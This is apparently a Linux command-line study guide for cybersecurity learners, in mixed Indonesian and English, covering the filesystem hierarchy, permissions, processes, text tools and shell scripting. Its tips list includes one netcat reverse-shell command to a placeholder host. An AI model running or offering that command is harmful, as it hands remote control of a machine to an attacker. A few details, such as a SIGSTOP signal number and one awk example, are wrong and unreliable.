# 🐧 Linux & Command Line - In-Depth Guide

## 🔍 Apa Itu Linux & Command Line?

Linux adalah operating system open-source berbasis Unix yang menggerakkan sebagian besar server internet dan infrastructure modern. Command line (terminal/CLI) adalah interface text-based untuk berinteraksi dengan system melalui perintah.

**Mengapa Penting dalam Cyber Security:**
- 90% server menggunakan Linux
- Pentesting tools largely built for Linux
- Deep understanding = powerful troubleshooting
- Basis untuk scripting dan automation

## 🐧 1. File System Hierarchy Standard (FHS)

### Linux FHS Tree Structure

```
/
├── bin/           # Essential commands (sh, ls, ps, etc.)
├── boot/          # Bootloader dan kernel files (vmlinuz, grub/)
├── dev/           # Device files (/dev/null, /dev/sda)
├── etc/           # System configuration
│   ├── passwd     # User accounts
│   ├── shadow     # Password hashes
│   ├── hosts      # Hosts mapping
│   └── rc.d/      # Startup scripts
├── home/          # User directories (/home/user1, /home/user2)
├── lib/           # Essential libraries (glibc.so, modules/)
├── media/         # Mount points removable media
├── mnt/           # Mount points network drives
├── opt/           # Third-party applications
├── proc/          # Virtual filesystem process info
│   ├── cpuinfo    # CPU information
│   ├── meminfo    # Memory usage
│   ├── net/       # Network sockets
│   └── [pid]/     # Process directories
├── root/          # Root user home directory
├── run/           # Runtime data (PID files, sockets)
├── sbin/          # System binaries (fsck, reboot, ifconfig)
├── srv/           # Service data served by system
├── sys/           # Kernel & device information
├── tmp/           # Temporary files (cleared on reboot)
├── usr/           # User programs & data
│   ├── bin/       # User command binaries
│   ├── include/   # C header files
│   ├── lib/       # Libraries untuk /usr/bin
│   ├── local/     # Locally built apps
│   ├── share/     # Shared data (man pages, docs, icons)
│   └── src/       # Source code
└── var/           # Variable files that change
    ├── cache/     # Cache files
    ├── lib/       # Variable state info
    ├── lock/      # Lock files
    ├── log/       # Log files (/var/log/auth.log, /var/log/syslog)
    ├── run/       # Runtime data sudah move ke /run
    ├── spool/     # Spool directories (mail, cron)
    └── tmp/       # Temporary files persistent
```

**Important FHS Rules:**
- `/proc`, `/sys`, dan `/dev` adalah virtual filesystems
- `/tmp` bisa write by anyone, tapi cleared on reboot
- `/var/run` sekarang symlink ke `/run`
- `/usr/local` untuk local installs, tidak conflict dengan package managers

### Linux Directory Structure Complete

Linux filesystem dibangun berdasarkan Filesystem Hierarchy Standard (FHS) - standar yang menetapkan struktur directory. Master ini = paham system works!

#### Root Level (`/`)
- **Absolute path starts here**
- **Mount point all other filesystems**
- **Single `/` handles one filesystem**

#### Essential Directories
- `/bin` - Essential commands binaries (ls, cp, mv, cat, echo)
- `/sbin` - System binaries (fdisk, iptables, root-only commands)
- `/lib` - Essential shared libraries (`/lib64` untuk 64-bit)
- `/lib*/modules` - Kernel modules (.ko files)

#### Configuration & Data
- `/etc` - System-wide configuration files
  - `passwd` (user accounts) / `shadow` (passwords)
  - `fstab` (filesystem mounts) / `resolv.conf` (DNS)
  - `sshd/` (SSH config) / `apache2/` (web server)
- `/var` - Variable data that changes during operation
  - `/var/log/` - System logs (auth.log, syslog)
  - `/var/run/` - Process IDs (.pid files)
  - `/var/spool/` - Queued jobs (mail, cron)
  - `/var/lock/` - Lock files (prevent conflicts)
- `/tmp` - Temporary files (cleared on reboot)

#### User & Applications
- `/usr` - User applications dan libraries
  - `/usr/bin/` - Application binary files
  - `/usr/lib/` - Libraries for /usr/bin
  - `/usr/share/` - Shared data (docs, icons, fonts)
  - `/usr/local/` - Locally compiled applications
- `/opt` - Third-party applications (proprietary software)
- `/home` - User home directories
  - Structure: `/home/username/{Documents,Downloads,Desktop,etc}`

#### System & Kernel
- `/boot` - Boot loader files (grub, kernel image vmlinuz)
- `/proc` - Process & kernel information (virtual filesystem)
  - `/proc/cpuinfo` - CPU details
  - `/proc/meminfo` - Memory usage
  - `/proc/net/` - Network statistics
  - `/proc/[pid]/` - Per-process info
- `/sys` - Kernel & device information
- `/dev` - Device files (block/char devices)
  - `/dev/null` - Discard output (/dev/null 2>&1)
  - `/dev/random` - Random data source
  - `/dev/zero` - Zero byte stream

#### Advanced FHS Concepts

**Standard Locations:**
- Man pages: `/usr/share/man/`
- Info docs: `/usr/share/info/`
- Locale data: `/usr/share/locale/`
- Time zones: `/usr/share/zoneinfo/`

**Symbolic Links Usage:**
- Many binaries link ke `/usr/bin` untuk compatibility
- Libraries hard/sym links memanage versions

**Partitioning Best Practices:**
- Separate `/var` for log-heavy servers
- `/home` pada disk besar untuk user data
- `/boot` pada partition pertama untuk GRUB

#### Permission Hierarchy Logic

**World-Readable Files:**
- `/etc/passwd` - User info (readable)
- `/etc/shadow` - Encrypted passwords (-r--------)

**Executable Directories:**
- `/usr/local/bin` - 755 (rwxr-xr-x)
- User home: drwxr-x--- (owner full, group partial)

#### Finding Anything

```bash
# Find configuration files
find /etc -name "*.conf" | head -10

# Find log files
find /var/log -name "*.log" | head -5

# Find executable files
find /usr/bin -type f -executable | wc -l

# Check disk usage by directory
du -sh /* | sort -rh | head -10
```

### Konsep-Konsep Orang Lain Jarang Tau

#### **Inode (Yang Sejati)**
```bash
ls -i file.txt  # Lihat inode number
```
- Nomor unik untuk setiap file
- Hard links share inode
- Soft links point ke inode

#### **Hard Link vs Soft Link**
```bash
ln file1 file2           # Hard link: pointer ke sama data
ln -s file1 file3        # Soft link: shortcut, beda inode
stat file2 file3         # Lihat perbedaannya
```

#### **Special Permissions - Power of Linux**
```bash
chmod u+s file          # SETUID: run as owner
chmod g+s file          # SETGID: run as group
chmod o+t folder        # Stick bit: owner only delete

# Check dengan: ls -l filename
# Output: -rwsr-xr-x (s = SETUID enabled)
```

### File Operations Mastery
```bash
# Navigation
pwd                    # Current location
cd /home/user         # Absolute path
cd ~                  # Home directory
cd -                  # Previous directory

# Listing dengan details
ls -la                # Long list all files
ls -lh                # Human readable size
ls -lt                # Sort by modification time

# Permissions (octal)
chmod 755 file        # rwxr-xr-x
chmod 644 file        # rw-r--r--
chmod -R 755 dir/     # Recursive

# File inspection
file filename         # Check type
od -c file.txt        # Octal dump
hexdump filename      # Hex viewer
```

## 🔄 2. Process Management - Beyond PS & Kill

### Process Signals
```bash
kill -SIGTERM 1234    # Graceful termination (15)
kill -SIGKILL 1234    # Force kill (9)
kill -SIGSTOP 1234    # Pause process (17)
kill -SIGCONT 1234    # Continue paused (18)

# Common: kill 1234 = SIGTERM
```

### Process Prioritization
```bash
nice -n 10 command    # Start dengan priority turun
renice -10 -p 1234    # Ganti priority proses existing

# Range: -20 (highest) to 19 (lowest)
```

### Orphan & Zombie Processes
- **Zombie:** Process died but parent belum clear entry
- **Orphan:** Parent died, diadopt oleh init
- Bahaya: Zombie consume resources

### Advanced Process Investigation
```bash
ps aux                  # All processes detailed
top -p 1234            # Monitor specific process
htop                   # Interactive process viewer
strace -p 1234         # Trace system calls
lsof -p 1234           # Files opened by process
```

## ⚡ 3. Text Processing Powerhouses

### SED (Stream Editor) - Pattern Replacement
```bash
# Basic replace
sed 's/old/new/g' file          # Global replace
sed '10,20s/old/new/g' file     # Baris 10-20 saja
sed 's|^|$|' file               # Add $ to each line

# Advanced
sed '/start/,/end/d' file       # Delete block
sed -i 's/old/new/g' file       # In-place edit
```

### AWK - Switzerland Army Knife
```bash
# Basic usage
awk '{print $1}' file           # Field pertama
awk -F',' '{print $2}' file     # Custom delimiter
awk 'NR>5 && NR<10' file        # Line 6-9

# Pattern matching
awk '$1 ~ /root/ {print}' /etc/passwd
awk 'BEGIN{cmd="hostname"} cmd | getline host; print host' file

# Built-in variables
# NR: current record (line) number
# NF: number of fields in current record
# FS: field separator
```

### Grep Power Tips
```bash
grep -r "pattern" dir/          # Recursive search
grep -i "Pattern" file          # Case insensitive
grep -v "pattern" file          # Invert match
grep -A 5 -B 5 "pattern" file   # Context lines
grep -E "pattern1|pattern2" file # Extended regex
```

## 🛠 4. Lesser-Known Linux Tricks

### Shell Features
```bash
# History usage
!n                     # Repeat command number n
!!                     # Repeat last command
!grep                  # Repeat last grep command

# Brace expansion
mkdir {01..10}         # Create 10 folders
touch file{1,2,3}.txt  # file1.txt file2.txt file3.txt
cp file.txt{,.bak}     # Equivalent to cp file.txt file.txt.bak

# Process substitution
comm <(sort list1) <(sort list2)  # Compare sorted lists
diff <(grep old_pattern file) <(grep new_pattern file)

# Command line math
echo $((2+2))          # Arithmetic expansion
```

### File Operations Hidden Gems
```bash
# Multiple operations
touch file{001..100}    # Touch 100 files
rm !(important_file)    # Delete all except one (bash 4.3+)
find . -mtime +30 -delete  # Files older than 30 days

# Archive with compression
tar -czf archive.tar.gz dir/  # Create
tar -tzf archive.tar.gz       # List contents
tar -xzf archive.tar.gz       # Extract
```

### Networking via Terminal
```bash
# SSH tricks
ssh user@host 'command'       # Run remote command
scp file.txt user@host:~      # Copy to remote
rsync -avz source/ user@host:dest/  # Sync folders

# Network checks
ping -c 4 google.com          # Basic ping
mtr google.com                # Traceroute + ping
dig google.com                # DNS lookup
nslookup google.com           # Alternative DNS lookup
```

## 📜 Shell Scripting Essentials

### Basic Structure
```bash
#!/bin/bash
# Shebang: interpreter path

# Variables
NAME="World"
echo "Hello ${NAME}!"

# Conditionals
if [ $1 -gt 10 ]; then
    echo "Parameter > 10"
elif [ $1 -eq 10 ]; then
    echo "Equal to 10"
else
    echo "Less than 10"
fi

# Loops
for i in {1..5}; do
    echo "Count: $i"
done

while [ $count -lt 10 ]; do
    ((count++))
done

# Functions
greet() {
    echo "Hello $1"
}

greet "World"
```

### Parameter Expansion
```bash
${var:-default}       # Use default if unset
${var:=default}       # Set default if unset
${var:position}       # Substring
${var#prefix}         # Remove shortest prefix match
${var##prefix}        # Remove longest prefix match
${var%suffix}         # Remove shortest suffix match
${var%%suffix}        # Remove longest suffix match
```

### Array Operations
```bash
# Declare array
array=("item1" "item2" "item3")

# Access
echo ${array[0]}      # First element
echo ${array[*]}      # All elements

# Operations
echo ${#array[@]}     # Length
array+=("new_item")   # Append
unset array[1]        # Remove
```

## 🛠 Kali Linux Basics

### Package Management
```bash
sudo apt update              # Update package lists
sudo apt upgrade             # Upgrade all packages
sudo apt install package     # Install new package
apt list --installed | grep pkg  # Check if installed
```

### Sources Configuration
```bash
cat /etc/apt/sources.list    # Current sources
echo "deb http://repo.kali.org/kali kali-rolling main" >> /etc/apt/sources.list
```

### Kernel Modules
```bash
lsmod                         # List loaded modules
modprobe module_name          # Load module
modprobe -r module_name       # Remove module
modinfo module_name           # Module info
```

## 💡 Pro Tips Linux

1. **Alias Creation:** `alias ll='ls -alF'`
2. **Terminal Multiplexer:** `tmux` or `screen`
3. **Disk Space Analysis:** `du -sh * | sort -h`
4. **Process Search:** `pgrep -f process_name`
5. **Background Jobs:** `command &` then `jobs` `fg %1`
6. **Reverse Shell Concept:** `nc -e /bin/bash 10.0.0.1 4444`
7. **Disk Speed Test:** `dd if=/dev/zero of=test bs=1M count=100`
8. **System Info:** `uname -a`, `lscpu`, `lsblk`

## 📚 Learning Resources

- **Books:** "The Linux Command Line" by William Shotts
- **Online:** LinuxJourney.com, Linux Documentation Project
- **Practice:** OverTheWire Bandit, Exploit Exercises Nebula
- **Communities:** Reddit r/linux, Stack Overflow

---

**Goal:** Master Linux seperti master swordsman. Setiap command harusnya extension dari thought process mu. Foundation yang kuat untuk pentesting lebih advanced. 🚀
